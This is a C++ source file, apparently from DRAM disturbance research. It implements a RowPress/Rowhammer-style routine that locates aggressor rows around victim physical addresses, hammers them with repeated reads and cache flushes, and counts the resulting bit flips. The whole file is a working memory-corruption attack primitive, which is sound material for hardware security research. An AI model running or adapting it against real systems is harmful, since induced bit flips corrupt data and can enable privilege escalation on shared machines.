#include "../shared.hh"
#include "../params.hh"
#include "../util.hh"
#include <unistd.h>

uint32_t press(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
    // prime
    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
    
    flush_row(vict_virt_addr_ptr);
    flush_row(attacker_virt_addr_1_ptr);
    flush_row(attacker_virt_addr_2_ptr);
  
    for (int iter = 0; iter < PRESS_PER_ITER; iter++) {
        for (int i = 0; i < PRESS_NUM_AGGR_ACTS; i++) {
            for (int j = 0; j < PRESS_NUM_READS; j++) {
                maccess((uint64_t)(attacker_virt_addr_1_ptr + j));
            }

            for (int j = 0; j < PRESS_NUM_READS; j++) {
                maccess((uint64_t)(attacker_virt_addr_2_ptr + j));
            }

            for (int j = 0; j < PRESS_NUM_READS; j++) {
                clflush((uint64_t)(attacker_virt_addr_1_ptr + j));
                clflush((uint64_t)(attacker_virt_addr_2_ptr + j));
            }
            mfence();
        }
    }

    flush_row(vict_virt_addr_ptr);

    uint32_t number_of_bitflips_in_target = count_flips(vict_virt_addr_ptr, 0x55);
    print_result(vict_virt_addr, attacker_virt_addr_1, attacker_virt_addr_2, number_of_bitflips_in_target);
    if (number_of_bitflips_in_target) {
        print_diff(vict_virt_addr_ptr, 0x55);
    }
    return number_of_bitflips_in_target; 
}

void press_all() {
    uint64_t mem_size = 1.8 * BUFFER_SIZE;
    allocated_mem = allocate_pages(mem_size);
    setup_PPN_VPN_map(allocated_mem, mem_size);

    uint64_t victim; 
    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 

    while (true) {
        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / PAGE_SIZE)));
        // row + 1, row - 1
        if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 1)) {
            uint32_t num_bit_flips = press(victim, *attacker_1, *attacker_2);
            if (num_bit_flips > 0) break;
        }
    }
}

void press_one(uint64_t *victims, int num_victims) {
    uint64_t mem_size = 1.8 * BUFFER_SIZE;
    uint64_t* attacker_1 = (uint64_t*) calloc(num_victims, sizeof(uint64_t));
    uint64_t* attacker_2 = (uint64_t*) calloc(num_victims, sizeof(uint64_t)); 
    uint64_t* victims_virt_addr = (uint64_t*) calloc(num_victims, sizeof(uint64_t));

    while (true) {
        printf("Attempting to locate physical addresses\n");
        void *temp = allocate_pages(mem_size);
        deallocate_pages(allocated_mem, mem_size);
        allocated_mem = temp;
        setup_PPN_VPN_map(allocated_mem, mem_size);

        int i;
        for (i = 0; i < num_victims; i++) {
            if (get_addresses_to_hammer(victims[i], &attacker_1[i], &attacker_2[i], 1)) {
                printf("Located victim %d\n", i);
                victims_virt_addr[i] = phys_to_virt(victims[i]);
            } else {
                printf("Could not find victim %d. Trying again for all victims\n", i);
                break;
            }
        }
        if (i == num_victims) {
            printf("Located all address. Will start pressing now.\n");
            break;
        }
    }

    while (true) {
        for (int i = 0; i < num_victims; i++) {
            uint32_t num_bit_flips = press(victims_virt_addr[i], attacker_1[i], attacker_2[i]);
            if (num_bit_flips > 0) break;
        }
    }
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc == 1) {
        press_all();
    } else {
        uint64_t victims[argc - 1];
        for (int i = 1; i < argc; i++) {
            victims[i - 1] = strtol(argv[i], NULL, 10);
        }
        press_one(victims, argc - 1);
    }
}

